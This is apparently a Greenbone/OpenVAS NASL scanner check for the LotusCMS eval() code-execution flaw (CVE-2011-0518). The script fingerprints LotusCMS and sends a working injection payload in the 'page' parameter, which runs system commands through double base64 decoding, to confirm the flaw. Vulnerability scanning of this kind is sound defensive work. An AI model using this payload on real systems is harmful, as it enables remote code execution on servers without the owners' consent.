if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.903312" );
	script_version( "2021-08-05T12:20:54+0000" );
	script_bugtraq_id( 52349 );
	script_cve_id( "CVE-2011-0518" );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-05 12:20:54 +0000 (Thu, 05 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-06-27 14:55:42 +0530 (Thu, 27 Jun 2013)" );
	script_name( "LotusCMS PHP Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43682" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18565" );
	script_xref( name: "URL", value: "http://secunia.com/secunia_research/2011-21" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122161/lotus_eval.py.txt" );
	script_xref( name: "URL", value: "http://metasploit.org/modules/exploit/multi/http/lcms_php_exec" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to obtain
  some sensitive information or execute arbitrary code on the vulnerable Web
  server." );
	script_tag( name: "affected", value: "LotusCMS version 3.03, 3.04 and other versions may also be
  affected." );
	script_tag( name: "insight", value: "Input passed via the 'req' and 'page' parameters to index.php is
  not properly sanitised in the 'Router()' function in core/lib/router.php before
  being used in an 'eval()' call." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running LotusCMS and is prone to php code execution
  vulnerability." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("url_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/lcms", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	res = http_get_cache( item: url, port: port );
	if(isnull( res )){
		continue;
	}
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "LotusCMS<" ) && ContainsString( res, "MSS<" )){
		cmds = exploit_commands();
		for cmd in keys( cmds ) {
			_cmd = base64( str: cmds[cmd] );
			en_cmd = base64( str: _cmd );
			url_en_cmd = urlencode( str: en_cmd );
			url = dir + "/index.php?page=index%27)%3B%24%7Bsystem(base64_decode" + "(base64_decode(%27" + url_en_cmd + "%27)))%7D%3B%23";
			if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: cmd )){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

